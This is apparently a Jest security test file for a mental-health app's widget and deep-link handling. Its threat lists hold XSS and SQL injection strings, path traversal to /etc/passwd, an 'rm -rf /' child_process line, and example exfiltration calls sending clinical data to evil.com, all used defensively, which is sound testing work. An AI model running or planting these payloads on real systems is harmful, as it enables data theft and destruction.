/**
 * Widget Security Integration Tests
 * Clinical-grade security validation for widget data handling
 * Ensures HIPAA-aware privacy protection and threat prevention
 */

import { jest } from '@jest/globals';
import { Platform } from 'react-native';
import { 
  WidgetDataService,
  WidgetNativeBridgeService,
  widgetTestUtils,
  widgetTestAssertions
} from '../../src/services/widgets';
import { useCheckInStore } from '../../src/store/checkInStore';
import type {
  WidgetData,
  PrivacyValidationResult,
  WidgetBridgeError
} from '../../src/types/widget';

// Security test scenarios
const SECURITY_THREATS = {
  XSS_PAYLOADS: [
    '<script>alert("xss")</script>',
    'javascript:alert("xss")',
    'onload=alert("xss")',
    '"><script>alert("xss")</script>',
    '\'+alert("xss")+\'',
    '${alert("xss")}',
    '#{alert("xss")}'
  ],
  SQL_INJECTION: [
    '\'; DROP TABLE users; --',
    '1\' OR \'1\'=\'1',
    '\' UNION SELECT * FROM assessments --',
    'admin\'--',
    '\' OR 1=1 --'
  ],
  CLINICAL_DATA_LEAKS: [
    'phq9Score: 18',
    'gad7Score: 15',
    'suicidalIdeation: true',
    'Patient ID: 12345',
    'MRN: 67890',
    'SSN: 123-45-6789',
    'diagnosis: Major Depressive Disorder',
    'medication: Sertraline 50mg',
    'therapist: Dr. Smith',
    'insurance: BlueCross 123-456-789',
    'emergency contact: John Doe 555-1234',
    'personal note: I am having dark thoughts',
    'assessment score: severe depression detected'
  ],
  DEEP_LINK_ATTACKS: [
    'fullmind://../../private-data',
    'fullmind://../../../etc/passwd',
    'fullmind://checkin/morning?xss=<script>alert("xss")</script>',
    'fullmind://crisis?redirect=http://evil.com',
    'javascript:alert("Deep link XSS")',
    'data:text/html,<script>alert("Data URI XSS")</script>',
    'file:///private/var/mobile/Library/Application Support/FullMind/assessments.db'
  ],
  DATA_EXFILTRATION: [
    'fetch("http://evil.com/steal", {method: "POST", body: JSON.stringify(userData)})',
    'new Image().src = "http://evil.com/track?data=" + encodeURIComponent(JSON.stringify(assessmentData))',
    'navigator.sendBeacon("http://evil.com/collect", JSON.stringify(clinicalData))'
  ]
} as const;

// Mock with security monitoring
jest.mock('react-native', () => ({
  Platform: { OS: 'ios' },
  NativeModules: {
    FullMindWidgets: {
      updateWidgetData: jest.fn().mockImplementation((data) => {
        // Security: Validate data before processing
        if (typeof data !== 'string') {
          throw new Error('Invalid data type');
        }
        try {
          JSON.parse(data); // Ensure valid JSON
          return Promise.resolve();
        } catch {
          throw new Error('Invalid JSON data');
        }
      }),
      reloadWidgets: jest.fn().mockResolvedValue(undefined),
      setAppGroupData: jest.fn().mockResolvedValue(undefined),
      getAppGroupData: jest.fn().mockResolvedValue('{}'),
      performHealthCheck: jest.fn().mockResolvedValue(true),
      clearWidgetData: jest.fn().mockResolvedValue(undefined)
    }
  },
  NativeEventEmitter: jest.fn(() => ({
    addListener: jest.fn(),
    removeAllListeners: jest.fn()
  })),
  Linking: {
    openURL: jest.fn(),
    canOpenURL: jest.fn().mockResolvedValue(true)
  }
}));

jest.mock('expo-secure-store', () => ({
  setItemAsync: jest.fn().mockResolvedValue(undefined),
  getItemAsync: jest.fn().mockResolvedValue(null),
  deleteItemAsync: jest.fn().mockResolvedValue(undefined)
}));

describe('Widget Security Integration Tests', () => {
  let dataService: WidgetDataService;
  let nativeBridge: WidgetNativeBridgeService;

  beforeEach(() => {
    jest.clearAllMocks();
    
    dataService = new WidgetDataService();
    nativeBridge = new WidgetNativeBridgeService();
    
    setupSecureTestEnvironment();
  });

  afterEach(() => {
    nativeBridge?.dispose();
  });

  describe('Clinical Data Privacy Protection', () => {
    test('should prevent all clinical data from reaching widgets', async () => {
      const store = useCheckInStore.getState();
      
      // Inject comprehensive clinical data into store
      (store as any).clinicalData = {
        // Assessment scores
        phq9Score: 18,
        gad7Score: 15,
        severityLevel: 'severe',
        riskLevel: 'high',
        
        // Personal health information
        patientId: 'PT-12345',
        medicalRecordNumber: 'MRN-67890',
        socialSecurityNumber: '123-45-6789',
        dateOfBirth: '1985-06-15',
        
        // Clinical notes
        diagnosis: 'Major Depressive Disorder with Suicidal Ideation',
        treatmentPlan: 'Intensive CBT, medication management',
        clinicalNotes: 'Patient reports severe depression with thoughts of self-harm',
        riskAssessment: 'High risk for suicide, requires immediate intervention',
        
        // Provider information
        therapist: 'Dr. Sarah Johnson, PhD',
        psychiatrist: 'Dr. Michael Chen, MD',
        facility: 'Metro Mental Health Center',
        
        // Contact and insurance
        emergencyContact: {
          name: 'Jane Doe',
          relationship: 'spouse',
          phone: '555-123-4567'
        },
        insurance: {
          provider: 'BlueCross BlueShield',
          policyNumber: '123-456-789',
          groupNumber: 'GRP-001'
        },
        
        // Personal notes
        personalJournal: 'I have been having dark thoughts lately. Sometimes I think about ending it all.',
        copingStrategies: 'Deep breathing when feeling overwhelmed',
        triggerEvents: ['work stress', 'family conflicts', 'financial worries'],
        
        // Medication information
        medications: [
          { name: 'Sertraline', dose: '50mg', frequency: 'daily' },
          { name: 'Lorazepam', dose: '0.5mg', frequency: 'as needed' }
        ],
        
        // Session data
        sessionNotes: 'Client appeared withdrawn and expressed hopelessness',
        therapeuticGoals: ['Reduce depressive symptoms', 'Develop coping skills'],
        homeworkAssignments: ['Daily mood tracking', 'Breathing exercises']
      };
      
      // Generate widget data - should be completely safe
      const widgetData = await dataService.generateWidgetData();
      
      // Comprehensive security scan
      const securityScan = performSecurityScan(widgetData);
      
      expect(securityScan.clinicalDataLeaks).toHaveLength(0);
      expect(securityScan.personalInfoLeaks).toHaveLength(0);
      expect(securityScan.sensitivePatterns).toHaveLength(0);
      
      // Verify privacy validation catches all violations
      const privacyResult = widgetTestUtils.validatePrivacy((store as any).clinicalData);
      expect(privacyResult.isValid).toBe(false);
      expect(privacyResult.violations.length).toBeGreaterThan(10); // Should detect many violations
    });

    test('should enforce strict data size limits', async () => {
      const oversizedData = {
        normalField: 'valid data',
        oversizedField: 'x'.repeat(100000), // 100KB of data
        massiveArray: Array.from({ length: 10000 }, (_, i) => `item_${i}`)
      };
      
      const privacyResult = widgetTestUtils.validatePrivacy(oversizedData);
      
      expect(privacyResult.isValid).toBe(false);
      expect(privacyResult.violations).toContainEqual(
        expect.objectContaining({
          violationType: 'size_limit_exceeded',
          field: 'size'
        })
      );
    });

    test('should detect and prevent data exfiltration attempts', async () => {
      const exfiltrationAttempts = SECURITY_THREATS.DATA_EXFILTRATION;
      
      for (const attempt of exfiltrationAttempts) {
        const maliciousData = {
          normalData: 'safe content',
          maliciousCode: attempt,
          hiddenPayload: btoa(attempt) // base64 encoded
        };
        
        const privacyResult = widgetTestUtils.validatePrivacy(maliciousData);
        
        expect(privacyResult.isValid).toBe(false);
        expect(privacyResult.filteredData).toBeNull();
      }
    });
  });

  describe('Deep Link Security', () => {
    test('should reject malicious deep link URLs', async () => {
      const maliciousUrls = SECURITY_THREATS.DEEP_LINK_ATTACKS;
      
      for (const maliciousUrl of maliciousUrls) {
        await expect(
          dataService.handleWidgetDeepLink(maliciousUrl)
        ).rejects.toThrow(expect.objectContaining({
          code: 'DEEP_LINK_INVALID'
        }));
      }
    });

    test('should validate deep link URL schemes strictly', async () => {
      const invalidSchemes = [
        'http://evil.com/fullmind',
        'https://phishing.com/app',
        'ftp://file.server.com/data',
        'javascript:alert("xss")',
        'data:text/html,<script>alert("xss")</script>',
        'file:///private/data',
        'app://redirect?url=http://evil.com'
      ];
      
      for (const invalidUrl of invalidSchemes) {
        await expect(
          dataService.handleWidgetDeepLink(invalidUrl)
        ).rejects.toThrow(expect.objectContaining({
          code: 'DEEP_LINK_INVALID'
        }));
      }
    });

    test('should sanitize deep link parameters', async () => {
      const xssPayloads = SECURITY_THREATS.XSS_PAYLOADS;
      
      for (const payload of xssPayloads) {
        const maliciousUrl = `fullmind://checkin/morning?resume=true&data=${encodeURIComponent(payload)}`;
        
        await expect(
          dataService.handleWidgetDeepLink(maliciousUrl)
        ).rejects.toThrow();
      }
    });

    test('should prevent path traversal attacks', async () => {
      const pathTraversalUrls = [
        'fullmind://../../private-data',
        'fullmind://../../../etc/passwd',
        'fullmind://checkin/../../../sensitive-file',
        'fullmind://crisis/../../../../database.db',
        'fullmind://./../../config.json'
      ];
      
      for (const url of pathTraversalUrls) {
        await expect(
          dataService.handleWidgetDeepLink(url)
        ).rejects.toThrow(expect.objectContaining({
          code: 'DEEP_LINK_INVALID'
        }));
      }
    });
  });

  describe('Native Bridge Security', () => {
    test('should validate data before sending to native modules', async () => {
      const { FullMindWidgets } = require('react-native').NativeModules;
      
      // Mock native module to simulate security validation
      FullMindWidgets.updateWidgetData.mockImplementation((data) => {
        if (typeof data !== 'string') {
          throw new Error('Security: Invalid data type');
        }
        
        // Check for malicious patterns
        const maliciousPatterns = [
          /<script/i,
          /javascript:/i,
          /on\w+\s*=/i,
          /eval\s*\(/i,
          /Function\s*\(/i
        ];
        
        for (const pattern of maliciousPatterns) {
          if (pattern.test(data)) {
            throw new Error('Security: Malicious pattern detected');
          }
        }
        
        try {
          const parsed = JSON.parse(data);
          // Additional validation on parsed data
          if (containsSensitiveData(parsed)) {
            throw new Error('Security: Sensitive data detected');
          }
          return Promise.resolve();
        } catch (error) {
          if (error instanceof SyntaxError) {
            throw new Error('Security: Invalid JSON format');
          }
          throw error;
        }
      });
      
      // Test with malicious payloads
      const maliciousPayloads = [
        { script: '<script>alert("xss")</script>' },
        { eval: 'eval("malicious code")' },
        { function: 'new Function("return process")()' },
        { phq9: 'high score detected' }
      ];
      
      for (const payload of maliciousPayloads) {
        await expect(
          nativeBridge.storeWidgetData(payload as any)
        ).rejects.toThrow(/Security:/);
      }
    });

    test('should handle native module errors securely', async () => {
      const { FullMindWidgets } = require('react-native').NativeModules;
      
      // Simulate native module errors
      FullMindWidgets.updateWidgetData.mockRejectedValue(
        new Error('Native security validation failed')
      );
      
      const validData = widgetTestUtils.createMockWidgetData();
      
      await expect(
        nativeBridge.storeWidgetData(validData)
      ).rejects.toThrow('Native bridge operation failed');
      
      // Should not expose internal error details
      try {
        await nativeBridge.storeWidgetData(validData);
      } catch (error) {
        expect((error as Error).message).not.toContain('security validation');
        expect((error as Error).message).not.toContain('internal');
      }
    });

    test('should prevent injection attacks through native calls', async () => {
      const injectionAttempts = [
        ...SECURITY_THREATS.XSS_PAYLOADS,
        ...SECURITY_THREATS.SQL_INJECTION,
        'require("child_process").exec("rm -rf /")',
        'process.exit(1)',
        '__dirname + "/../../../sensitive"',
        'globalThis.sensitiveData'
      ];
      
      for (const attempt of injectionAttempts) {
        const maliciousData = {
          normalField: 'safe data',
          injection: attempt
        };
        
        await expect(
          nativeBridge.storeWidgetData(maliciousData as any)
        ).rejects.toThrow();
      }
    });
  });

  describe('Data Integrity Protection', () => {
    test('should detect data tampering attempts', async () => {
      const originalData = await dataService.generateWidgetData();
      const originalHash = originalData.encryptionHash;
      
      // Attempt to tamper with data
      const tamperedData = {
        ...originalData,
        todayProgress: {
          ...originalData.todayProgress,
          completionPercentage: 100 // Fake completion
        }
      };
      
      // Hash should be different, indicating tampering
      const newHash = await generateDataHash(tamperedData);
      expect(newHash).not.toBe(originalHash);
      
      // System should reject tampered data
      const validationResult = widgetTestUtils.validatePrivacy(tamperedData);
      expect(validationResult.isValid).toBe(true); // Structure is valid
      
      // But integrity check should fail
      const integrityCheck = await verifyDataIntegrity(tamperedData);
      expect(integrityCheck.isValid).toBe(false);
    });

    test('should maintain data consistency across operations', async () => {
      const operations = [
        () => dataService.generateWidgetData(),
        () => dataService.getCurrentWidgetData(),
        () => dataService.generateWidgetData()
      ];
      
      const results = await Promise.all(operations.map(op => op()));
      
      // All results should have consistent structure
      for (const result of results) {
        if (result) {
          widgetTestAssertions.assertValidWidgetData(result);
          widgetTestAssertions.assertNoPrivacyViolations(result);
        }
      }
      
      // Hash differences should only reflect time changes
      const hashes = results.map(r => r?.encryptionHash).filter(Boolean);
      expect(new Set(hashes).size).toBeGreaterThanOrEqual(1); // At least one unique hash
    });
  });

  describe('Input Validation and Sanitization', () => {
    test('should sanitize all user input', async () => {
      const maliciousInputs = [
        ...SECURITY_THREATS.XSS_PAYLOADS,
        'null',
        'undefined',
        '{}',
        '[]',
        'true',
        'false',
        '0',
        '-1',
        'Infinity',
        'NaN'
      ];
      
      for (const input of maliciousInputs) {
        // Test input sanitization in various contexts
        const testUrl = `fullmind://checkin/morning?data=${encodeURIComponent(input)}`;
        
        await expect(
          dataService.handleWidgetDeepLink(testUrl)
        ).rejects.toThrow();
      }
    });

    test('should validate widget configuration securely', async () => {
      const maliciousConfigs = [
        { updateFrequencyMs: -1 },
        { maxRetries: Infinity },
        { timeoutMs: 'malicious' },
        { privacyLevel: '<script>alert("xss")</script>' },
        { enabledFeatures: ['legitimate', 'eval("hack")'] }
      ];
      
      for (const config of maliciousConfigs) {
        expect(() => {
          dataService.updateConfiguration(config as any);
        }).not.toThrow(); // Should handle gracefully, not crash
        
        const currentConfig = dataService.getConfiguration();
        // Should maintain safe defaults
        expect(currentConfig.updateFrequencyMs).toBeGreaterThan(0);
        expect(currentConfig.maxRetries).toBeFinite();
        expect(typeof currentConfig.timeoutMs).toBe('number');
      }
    });
  });

  describe('Error Information Disclosure', () => {
    test('should not expose sensitive information in errors', async () => {
      const sensitiveOperations = [
        () => dataService.generateWidgetData(),
        () => dataService.handleWidgetDeepLink('invalid://url'),
        () => nativeBridge.storeWidgetData({} as any)
      ];
      
      for (const operation of sensitiveOperations) {
        try {
          await operation();
        } catch (error) {
          const errorMessage = (error as Error).message.toLowerCase();
          
          // Should not expose sensitive paths or internal details
          const forbiddenTerms = [
            'password',
            'token',
            'key',
            'secret',
            'private',
            'internal',
            'debug',
            'stack trace',
            '/users/',
            'phq9',
            'gad7',
            'assessment',
            'clinical',
            'patient'
          ];
          
          for (const term of forbiddenTerms) {
            expect(errorMessage).not.toContain(term);
          }
        }
      }
    });

    test('should provide generic error messages for security failures', async () => {
      const securityFailures = [
        'fullmind://../../private-data',
        'javascript:alert("xss")',
        'data:text/html,<script>alert("xss")</script>'
      ];
      
      for (const failure of securityFailures) {
        try {
          await dataService.handleWidgetDeepLink(failure);
        } catch (error) {
          expect((error as WidgetBridgeError).code).toBe('DEEP_LINK_INVALID');
          expect((error as Error).message).toMatch(/invalid.*deep.*link/i);
          expect((error as Error).message).not.toContain(failure); // Should not echo back the input
        }
      }
    });
  });
});

/**
 * Security Analysis Functions
 */
function performSecurityScan(data: unknown): {
  clinicalDataLeaks: string[];
  personalInfoLeaks: string[];
  sensitivePatterns: string[];
} {
  const dataString = JSON.stringify(data).toLowerCase();
  
  const clinicalPatterns = SECURITY_THREATS.CLINICAL_DATA_LEAKS.map(p => p.toLowerCase());
  const clinicalDataLeaks = clinicalPatterns.filter(pattern => dataString.includes(pattern));
  
  const personalInfoPatterns = [
    /\d{3}-\d{2}-\d{4}/, // SSN
    /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/, // Email
    /\d{3}-\d{3}-\d{4}/, // Phone
    /\b\d{16}\b/, // Credit card
    /pt-\d+/i, // Patient ID
    /mrn-\d+/i, // Medical record number
  ];
  
  const personalInfoLeaks = personalInfoPatterns.filter(pattern => pattern.test(dataString));
  
  const sensitivePatterns = [
    /<script/i,
    /javascript:/i,
    /on\w+\s*=/i,
    /eval\s*\(/i,
    /function\s*\(/i,
    /require\s*\(/i,
    /process\./i,
    /global\./i,
    /__dirname/i,
    /__filename/i
  ].filter(pattern => pattern.test(dataString));
  
  return {
    clinicalDataLeaks,
    personalInfoLeaks: personalInfoLeaks.map(p => p.toString()),
    sensitivePatterns: sensitivePatterns.map(p => p.toString())
  };
}

function containsSensitiveData(data: unknown): boolean {
  const scan = performSecurityScan(data);
  return scan.clinicalDataLeaks.length > 0 || 
         scan.personalInfoLeaks.length > 0 || 
         scan.sensitivePatterns.length > 0;
}

async function generateDataHash(data: unknown): Promise<string> {
  const dataString = JSON.stringify(data, Object.keys(data as object).sort());
  
  // Simple hash for testing (not cryptographically secure)
  let hash = 0;
  for (let i = 0; i < dataString.length; i++) {
    const char = dataString.charCodeAt(i);
    hash = ((hash << 5) - hash) + char;
    hash = hash & hash; // Convert to 32bit integer
  }
  
  return Math.abs(hash).toString(16);
}

async function verifyDataIntegrity(data: WidgetData): Promise<{ isValid: boolean; reason?: string }> {
  // In a real implementation, this would verify cryptographic signatures
  // For testing, we simulate integrity validation
  
  const expectedHash = await generateDataHash({
    morning: data.todayProgress.morning.status,
    midday: data.todayProgress.midday.status,
    evening: data.todayProgress.evening.status,
    completionPercentage: data.todayProgress.completionPercentage,
    timestamp: data.lastUpdateTime
  });
  
  if (expectedHash !== data.encryptionHash) {
    return { isValid: false, reason: 'Hash mismatch detected' };
  }
  
  return { isValid: true };
}

function setupSecureTestEnvironment(): void {
  // Setup mock store without sensitive data
  const secureStore = {
    checkIns: [],
    todaysCheckIns: [],
    currentCheckIn: null,
    
    // Ensure no clinical data is accessible
    assessmentData: null,
    clinicalData: null,
    personalData: null,
    
    getTodaysProgress: jest.fn().mockReturnValue({ completed: 0, total: 3 }),
    getTodaysCheckIn: jest.fn().mockReturnValue(null),
    getWidgetUpdateStatus: jest.fn().mockReturnValue({ needsUpdate: false, lastUpdate: null }),
    markWidgetUpdated: jest.fn(),
    addCheckIn: jest.fn()
  };
  
  const { useCheckInStore } = require('../../src/store/checkInStore');
  (useCheckInStore as any).getState = jest.fn(() => secureStore);
}